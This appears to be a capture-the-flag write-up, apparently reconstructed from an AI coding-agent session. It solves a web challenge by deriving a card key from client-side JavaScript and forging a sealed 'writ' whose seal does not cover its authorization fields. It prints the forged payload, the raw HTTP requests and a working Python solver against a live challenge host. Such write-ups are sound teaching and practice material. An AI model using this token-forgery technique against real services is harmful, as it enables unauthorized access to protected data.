# Wonderland — The Mad Tea-Party
> Reconstructed from Codex task [019f9d81-75da-7f93-a454-14abd9c8c7a1](thread://019f9d81-75da-7f93-a454-14abd9c8c7a1). Confirmed flags require intended-workflow evidence; rejected candidates remain explicitly marked.

## Challenge statement and supplied material

- **Exact challenge identity:** the prompt did not provide a separate title, but the real application identified itself as **The Mad Tea-Party**; the challenge is referred to as **Wonderland** in the task history.
- **Faithful prompt:**

  > The court keeps a small deck of cards behind a very large hedge maze. There is one real application here; everything else is maze.

- **Target:** [https://104.211.98.123/](https://104.211.98.123/)
- **Ticket minting endpoint:** [https://ctf.pointblank.club/hmac/ticket/72](https://ctf.pointblank.club/hmac/ticket/72)
- **Minted team ticket:**

  ```text
  [REDACTED_TEAM_TICKET]
  ```

## Category and status

- **Category:** Web; client-side access control plus a broken custom message-authentication boundary.
- **Status:** **Confirmed solved**
- **Confirmed flag:** `pbctf{b5d492a6cd107d71}`

## High-level solution

Most paths are intentional maze content. The real application exposes a four-card deck and client JavaScript containing the key derivation for sealed cards. Computing the key for card 87 returns a base64url writ. The writ includes an opaque `seal`, but the server's seal verification omits the authorization-bearing `grant` and `court` fields. Preserve the original subject, destination, and seal; change `court` to `queen` and `grant` to `read`; base64url-encode the JSON; submit it to `/api/audience` with the team ticket in a cookie named exactly `ticket`. The live HTTPS endpoint returns the flag.

## Detailed procedure

### 1. Find the real application

- Port 80 redirected to HTTPS.
- The real app was available over HTTPS on port 443 and directly over HTTP on port 8081.
- Its HTML and `/static/wonderland.js` identified it as “The Mad Tea-Party.”
- Numerous paths such as `/api/admin`, `/api/cards`, `/.git/*`, `/backup/*`, `/robots.txt`, `/internal/*`, and fake API versions were maze content or deliberate decoys.

### 2. Recover the client-side card-key algorithm

`/static/wonderland.js` contains:

```javascript
function cardKey(id) {
  const PHRASE = 'we_are_all_mad_here';
  const s = PHRASE + ':' + String(id);
  let h = 2166136261 >>> 0;
  for (let i = 0; i < s.length; i++) {
    h ^= s.charCodeAt(i);
    h = Math.imul(h, 16777619) >>> 0;
  }
  return h.toString(16).padStart(8, '0');
}
```

This is 32-bit FNV-1a over:

```text
we_are_all_mad_here:87
```

The derived key for card 87 is:

```text
de1b989f
```

Retrieve the card:

```http
GET /api/card?id=87&key=de1b989f
```

### 3. Decode the original writ

Card 87 returns a base64url writ. Decoding it gives:

```json
{
  "subject": 87,
  "grant": "turn",
  "court": "knave",
  "present_to": "/api/audience",
  "seal": "a6f591f4e1327261e5b9641aa8b85ad3"
}
```

The original encoded writ was:

```text
eyJzdWJqZWN0Ijo4NywiZ3JhbnQiOiJ0dXJuIiwiY291cnQiOiJrbmF2ZSIsInByZXNlbnRfdG8iOiIvYXBpL2F1ZGllbmNlIiwic2VhbCI6ImE2ZjU5MWY0ZTEzMjcyNjFlNWI5NjQxYWE4Yjg1YWQzIn0
```

Although the JavaScript comment calls the writ “HS256-signed,” this object is not a normal three-part JWT. The server accepts the embedded seal while parsing authorization fields separately.

### 4. Identify the unauthenticated fields

Changing fields individually produced useful differential errors:

- Original writ: `{"error":"that is no writ this court will honour"}`
- `court=queen`: `{"error":"the Queen will not hear that plea"}`
- `grant=read` alone: still the generic invalid-writ response
- `court=queen` and `grant=read`: reached the verdict handler but said the guest was nameless

This proves the seal does not bind `court` or `grant`. The working forged payload is:

```json
{
  "subject": 87,
  "grant": "read",
  "court": "queen",
  "present_to": "/api/audience",
  "seal": "a6f591f4e1327261e5b9641aa8b85ad3"
}
```

Its exact base64url encoding is:

```text
eyJzdWJqZWN0Ijo4NywiZ3JhbnQiOiJyZWFkIiwiY291cnQiOiJxdWVlbiIsInByZXNlbnRfdG8iOiIvYXBpL2F1ZGllbmNlIiwic2VhbCI6ImE2ZjU5MWY0ZTEzMjcyNjFlNWI5NjQxYWE4Yjg1YWQzIn0
```

### 5. Bind the team identity correctly

The team ticket was tested as query parameters, several custom headers, a bearer token, and several cookie names. Only this binding worked:

```http
Cookie: ticket=[REDACTED_TEAM_TICKET]
```

Final request:

```http
GET /api/audience?writ=eyJzdWJqZWN0Ijo4NywiZ3JhbnQiOiJyZWFkIiwiY291cnQiOiJxdWVlbiIsInByZXNlbnRfdG8iOiIvYXBpL2F1ZGllbmNlIiwic2VhbCI6ImE2ZjU5MWY0ZTEzMjcyNjFlNWI5NjQxYWE4Yjg1YWQzIn0 HTTP/1.1
Host: 104.211.98.123
Cookie: ticket=[REDACTED_TEAM_TICKET]
Connection: close
```

Equivalent Python logic:

```python
import base64
import http.client
import json
import ssl
import urllib.parse

payload = {
    "subject": 87,
    "grant": "read",
    "court": "queen",
    "present_to": "/api/audience",
    "seal": "a6f591f4e1327261e5b9641aa8b85ad3",
}
writ = base64.urlsafe_b64encode(
    json.dumps(payload, separators=(",", ":")).encode()
).rstrip(b"=").decode()

path = "/api/audience?writ=" + urllib.parse.quote(writ, safe="")
conn = http.client.HTTPSConnection(
    "104.211.98.123",
    443,
    context=ssl._create_unverified_context(),
)
conn.request(
    "GET",
    path,
    headers={"Cookie": "ticket=[REDACTED_TEAM_TICKET]", "Connection": "close"},
)
print(conn.getresponse().read().decode())
```

## Validation evidence

The final independent HTTPS request returned HTTP 200:

```json
{
  "subject": 87,
  "verdict": "Sentence first — verdict afterwards, the Queen always says. And so, read at last: pbctf{b5d492a6cd107d71}"
}
```

This response came from the intended `/api/audience` workflow with both the forged writ and the CTF-minted team identity, so the flag is confirmed.

## Skills used

- `solve-challenge`
- `ctf-web`
- `ctf-crypto`

## Tools, utilities, libraries, and services used

- PowerShell
- Python 3.12
- Python standard-library modules: `http.client`, `ssl`, `urllib.parse`, `base64`, `json`, `hmac`, `hashlib`, `itertools`
- Direct HTTP/HTTPS probing on ports 80, 443, and 8081
- Static JavaScript inspection
- 32-bit FNV-1a
- Base64url encoding/decoding
- Differential response analysis
- The PointBlank CTF ticket-minting service

## Decoys and rejected attempts

These are **not** the answer:

- Card 87 body: `pbctf{cli3nt_s1de_l0cks_0pen_f0r_any_gu3st}`. The body explicitly says the card is only the Queen's “sentence,” while the verdict lives elsewhere.
- `/api/cards` OpenAPI-like `x-hint`: `pbctf{5f957b67_writs}`.
- `/api/admin` maze hint: `pbctf{n3v3r_g0nna_giv3_y0u_up}`.
- Local unrelated file `hmac_work\flag.txt`: `pbctf{fake_flag}`.
- Git, backup, robot, fake Swagger, and versioned API paths were maze generators.
- Brute-forcing plausible HMAC secrets and encodings did not recover the seal secret and was unnecessary.
- JWT `alg:none` and HS256 variants were irrelevant because the writ was not a normal JWT.
- Editing only `grant` or only `court` was insufficient; both authorization fields had to be changed.
- Supplying the team ticket as a query parameter, custom header, bearer token, or the wrong cookie name failed. The exact cookie name was `ticket`.

## Surviving local artifacts

The live exploit was reconstructed in the session rather than committed as a standalone solver. A historical local `hmac_work` directory may still exist, but its `flag.txt` is explicitly unrelated and must not be promoted.

## Diagram recommendation

**Yes.** A field-integrity diagram makes the bug much clearer:

```text
/static/wonderland.js
  --[FNV-1a("we_are_all_mad_here:87")]--> key de1b989f
  --[/api/card]--> card 87 + base64url writ
  --[decode]--> subject | grant | court | present_to | seal
                         ^ unsigned ^ unsigned
  --[forge grant=read, court=queen; preserve seal]-->
  --[GET /api/audience + Cookie: ticket=...]-->
  confirmed verdict and flag
```

---

## Final High-Level Overview

Client JavaScript revealed the key for card 87. Its writ seal did not authenticate the court or grant fields, so changing them to queen and read while preserving the seal reached /api/audience; the correctly named ticket cookie bound the team identity and the live verdict returned the flag.
